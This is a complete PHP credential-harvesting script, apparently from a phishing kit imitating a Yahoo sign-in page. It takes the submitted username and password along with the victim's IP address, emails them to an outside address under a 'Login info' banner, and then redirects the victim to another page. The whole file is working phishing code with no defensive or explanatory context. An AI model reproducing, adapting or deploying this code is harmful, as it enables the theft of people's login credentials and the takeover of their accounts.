<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['username'];
$password = $_POST['passwd'];


$login = "E : ".$email;
$pass = "Prod : ".$password;
$target = "IP : ".$ip;


$head = "########### Login info ############";
$foot = "####### snOOpy lOdGe ###########";
$body = "Yah00 2";
mail("me@emailpostmaster.xyz", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: f.html");
?>